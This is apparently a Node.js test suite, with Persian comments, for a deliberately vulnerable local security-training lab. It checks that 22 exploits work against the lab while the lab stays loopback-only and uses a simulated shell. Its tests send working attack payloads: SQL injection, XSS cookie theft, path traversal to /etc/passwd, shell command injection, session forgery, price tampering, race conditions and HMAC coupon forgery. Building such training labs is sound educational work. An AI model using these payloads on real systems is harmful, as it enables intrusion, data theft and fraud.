// آزمون آزمایشگاه آسیب‌پذیر: برنامه واقعاً راه می‌افتد و هر ۲۲ آسیب‌پذیری (۱۴ اصلی + ۸ فروشگاه CP-Coin) با درخواست واقعی قابل بهره‌برداری است؛
// و مهم‌تر: فقط روی 127.0.0.1 گوش می‌دهد و هیچ فرمان/فایل واقعی دستگاه در دسترس نیست.
import test, { before, after } from "node:test";
import assert from "node:assert/strict";
import { spawn, spawnSync } from "node:child_process";
import { mkdtempSync, readFileSync, writeFileSync, existsSync } from "node:fs";
import { tmpdir, networkInterfaces } from "node:os";
import { join } from "node:path";
import http from "node:http";
import { HUB_SAMPLES } from "../mobile-src/assets/hub-data.js";

const py = ["python3", "python"].find((c) => spawnSync(c, ["--version"]).status === 0);
const PORT = 18000 + Math.floor(Math.random() * 1000);
const dir = mkdtempSync(join(tmpdir(), "cplab-"));
let proc, flags;
const base = `http://127.0.0.1:${PORT}`;

const get = (path, { method = "GET", body, headers = {}, host } = {}) =>
  new Promise((resolve, reject) => {
    const req = http.request(base + path, { method, headers: { ...(host ? { Host: host } : {}), ...(body ? { "content-length": Buffer.byteLength(body) } : {}), ...headers } }, (res) => {
      let data = ""; res.setEncoding("utf8"); res.on("data", (c) => (data += c)); res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
    });
    req.on("error", reject); if (body) req.write(body); req.end();
  });
const form = (obj) => new URLSearchParams(obj).toString();
const post = (path, obj, headers = {}) => get(path, { method: "POST", body: form(obj), headers: { "content-type": "application/x-www-form-urlencoded", ...headers } });

before(async () => {
  if (!py) return;
  const sample = HUB_SAMPLES.find((s) => s.id === "sec_lab_site");
  writeFileSync(join(dir, "lab.py"), sample.code);
  proc = spawn(py, ["-u", "lab.py"], { cwd: dir, env: { ...process.env, PYTHONUNBUFFERED: "1", CP_LAB_PORT: String(PORT), CP_LAB_TEST_COUPON: "4821" } });
  for (let i = 0; i < 60; i++) { try { await get("/"); break; } catch { await new Promise((r) => setTimeout(r, 100)); } }
  flags = JSON.parse(readFileSync(join(dir, "cp_lab_progress.json"), "utf8")).flags;
});
after(() => proc?.kill());

const need = { skip: !py && "python is not installed" };

test("the lab starts, lists 22 levels (14 original + 8 CP-Coin shop), and flags are unique per install", need, async () => {
  const r = await get("/");
  assert.equal(r.status, 200);
  assert.equal(Object.keys(flags).length, 22);
  assert.equal(new Set(Object.values(flags)).size, 22);
  assert.ok(Object.values(flags).every((f) => /^CP\{[a-z_]+_[0-9a-f]{6}\}$/.test(f)));
});

test("listens on loopback only and rejects foreign Host headers (DNS rebinding)", need, async () => {
  const ext = Object.values(networkInterfaces()).flat().find((i) => i && !i.internal && i.family === "IPv4");
  if (ext) {
    const refused = await new Promise((resolve) => { const s = http.get({ host: ext.address, port: PORT, timeout: 1500 }, () => resolve(false)); s.on("error", () => resolve(true)); s.on("timeout", () => { s.destroy(); resolve(true); }); });
    assert.ok(refused, "must not be reachable on " + ext.address);
  }
  assert.equal((await get("/", { host: "evil.example" })).status, 403);
});

test("1 SQLi login bypass", need, async () => {
  assert.ok(!(await post("/login", { username: "admin", password: "wrong" })).body.includes(flags[1]));
  assert.ok((await post("/login", { username: "admin'--", password: "x" })).body.includes(flags[1]));
});
test("2 SQLi UNION", need, async () => {
  const r = await get("/shop?q=" + encodeURIComponent("zzz' UNION SELECT 1,username,0,secret FROM users--"));
  assert.ok(r.body.includes(flags[2]));
});
test("3 reflected XSS + cookie", need, async () => {
  const p = "<img src=x onerror=alert(document.cookie)>";
  const r = await get("/search?q=" + encodeURIComponent(p));
  assert.ok(r.body.includes(p), "payload reflected unescaped");
  assert.ok(String(r.headers["set-cookie"]).includes(flags[3]) && !/httponly/i.test(String(r.headers["set-cookie"])));
});
test("4 stored XSS", need, async () => {
  const p = "<svg onload=alert(document.cookie)>";
  await post("/guestbook", { name: "x", body: p });
  const r = await get("/guestbook");
  assert.ok(r.body.includes(p));
  assert.ok(String(r.headers["set-cookie"]).includes(flags[4]));
});
test("5 IDOR", need, async () => { assert.ok((await get("/notes?id=7")).body.includes(flags[5])); });
test("6 path traversal (virtual files only)", need, async () => {
  assert.equal((await get("/download?file=" + encodeURIComponent("../private/flag.txt"))).status, 404, "single ../ is filtered");
  assert.ok((await get("/download?file=" + encodeURIComponent("....//private/flag.txt"))).body.includes(flags[6]));
  const pw = await get("/download?file=" + encodeURIComponent("....//....//....//etc/passwd"));
  assert.match(pw.body, /lab:x:1000/);
  assert.ok(!existsSync("/nonexistent-check") && pw.body.includes("/bin/sh"), "served from the virtual file system, not the real disk");
});
test("7 forged session cookie", need, async () => {
  assert.equal((await get("/admin")).status, 403);
  const c = Buffer.from(JSON.stringify({ user: "guest", role: "admin" })).toString("base64");
  assert.ok((await get("/admin", { headers: { cookie: "session=" + c } })).body.includes(flags[7]));
});
test("8 weak MD5 hash from forgotten backup → login as ali", need, async () => {
  const robots = await get("/robots.txt");
  assert.match(robots.body, /Disallow: \/backup\//);
  const dump = await get("/backup/db.sql.txt");
  const md5 = (await import("node:crypto")).createHash("md5").update("sunshine").digest("hex");
  assert.ok(dump.body.includes(md5));
  assert.ok((await post("/login", { username: "ali", password: "sunshine" })).body.includes(flags[8]));
});
test("9 open redirect", need, async () => {
  const r = await get("/go?url=" + encodeURIComponent("http://evil.example/"));
  assert.equal(r.status, 302);
  assert.equal(r.headers.location, "http://evil.example/");
  assert.equal(r.headers["x-flag"], flags[9]);
});
test("10 command injection works on the SIMULATED shell only", need, async () => {
  const r = await get("/tools/ping?host=" + encodeURIComponent("127.0.0.1; cat /srv/lab/secret/flag.txt"));
  assert.ok(r.body.includes(flags[10]));
  const marker = join(dir, "pwned.txt");
  const r2 = await get("/tools/ping?host=" + encodeURIComponent(`127.0.0.1; touch ${marker}; cat /etc/hostname`));
  assert.ok(!existsSync(marker), "no real command may run");
  assert.match(r2.body, /command not found/);
});
test("11 SSRF only reaches the lab itself, never the internet", need, async () => {
  assert.ok((await get(`/fetch?url=${encodeURIComponent(`http://127.0.0.1:${PORT}/internal`)}`)).body.includes(flags[11]));
  assert.equal((await get("/internal")).status, 403);
  const ext = await get("/fetch?url=" + encodeURIComponent("http://example.com/"));
  assert.equal(ext.status, 400);
});
test("12 insecure upload", need, async () => {
  const r = await get("/upload", { method: "POST", body: JSON.stringify({ name: "shell.php", content: "x" }), headers: { "content-type": "application/json" } });
  assert.ok(r.body.includes(flags[12]));
});
test("13 exposed debug page", need, async () => { assert.ok((await get("/debug")).body.includes(flags[13])); });
test("14 CSRF via GET", need, async () => {
  assert.ok(!(await get("/bank")).body.includes(flags[14]));
  assert.ok((await get("/bank?to=mallory&amount=500")).body.includes(flags[14]));
});
test("15 shop: wallet IDOR reveals another user's balance with no login", need, async () => {
  assert.ok(!(await get("/store/wallet?user=guest")).body.includes(flags[15]));
  assert.ok((await get("/store/wallet?user=admin")).body.includes(flags[15]));
});
test("16 shop: client-supplied price field is trusted (price tampering)", need, async () => {
  assert.ok(!(await post("/store/buy", { product_id: "1", qty: "1" })).body.includes(flags[16]), "real catalog price must not trigger the flag");
  assert.ok((await post("/store/buy", { product_id: "1", qty: "1", price: "1" })).body.includes(flags[16]));
});
test("17 shop: hidden 4-digit coupon has no rate limit (brute-forceable)", need, async () => {
  for (const wrong of ["0000", "1234", "9999", "4820", "4822"]) assert.doesNotMatch((await post("/store/redeem", { code: wrong })).body, /اعمال شد/);
  const r = await post("/store/redeem", { code: "4821" });
  assert.match(r.body, /اعمال شد/);
  assert.ok(r.body.includes(flags[17]));
});
test("18 shop: concurrent redeems race past a single-use coupon (TOCTOU)", need, async () => {
  const hits = await Promise.all(Array.from({ length: 8 }, () => post("/store/redeem", { code: "VIP-ONE-TIME" })));
  assert.ok(hits.filter((r) => /اعمال شد/.test(r.body)).length >= 2, "at least 2 of 8 concurrent requests must succeed against a quota of 1");
  assert.ok(hits.some((r) => r.body.includes(flags[18])));
});
test("19 shop: IDOR marks another user's pending order as paid with no ownership check", need, async () => {
  const r = await get("/store/order/1/mark-paid");
  assert.ok(r.body.includes(flags[19]));
  assert.match(r.body, /admin/);
});
test("20 shop: negative quantity increases balance instead of decreasing it", need, async () => {
  const before15 = JSON.parse(readFileSync(join(dir, "cp_lab_progress.json"), "utf8"));
  const r = await post("/store/buy", { product_id: "2", qty: "-5" });
  assert.ok(r.body.includes(flags[20]));
  assert.match(r.body, /موجودی جدید شما: \d+/);
});
test("21 shop: debug's leaked secret_key signs a forged 100%-off admin coupon", need, async () => {
  const dbg = JSON.parse((await get("/debug")).body);
  const { createHmac } = await import("node:crypto");
  const code = "FREE100";
  const sig = createHmac("sha256", dbg.secret_key).update(code).digest("hex").slice(0, 8);
  assert.ok(!(await post("/store/redeem", { code: code + "." + "00000000" })).body.includes(flags[21]), "a wrong signature must not validate");
  const r = await post("/store/redeem", { code: code + "." + sig });
  assert.ok(r.body.includes(flags[21]));
});
test("22 shop: chain the forged coupon onto the exclusive item for a near-zero real cost", need, async () => {
  const dbg = JSON.parse((await get("/debug")).body);
  const { createHmac } = await import("node:crypto");
  const sig = createHmac("sha256", dbg.secret_key).update("FREE100").digest("hex").slice(0, 8);
  const buy = await post("/store/buy", { product_id: "3", qty: "1", coupon: "FREE100." + sig });
  const oid = buy.body.match(/\/store\/order\/(\d+)\/mark-paid/)[1];
  const r = await get(`/store/order/${oid}/mark-paid`);
  assert.ok(r.body.includes(flags[22]));
});
test("flag submission and progress", need, async () => {
  assert.match((await post("/flags", { flag: "CP{wrong}" })).body, /اشتراک|اشتباه/);
  assert.match((await post("/flags", { flag: flags[1] })).body, /درست/);
  const prog = JSON.parse(readFileSync(join(dir, "cp_lab_progress.json"), "utf8"));
  assert.ok(prog.solved.length >= 10);
});
test("hints and walkthroughs exist for every level", need, async () => {
  for (let n = 1; n <= 22; n++) {
    assert.equal((await get(`/hints/${n}`)).status, 200);
    assert.ok((await get(`/walkthrough/${n}`)).body.includes("دفاع"), "walkthrough " + n + " teaches the fix");
  }
});
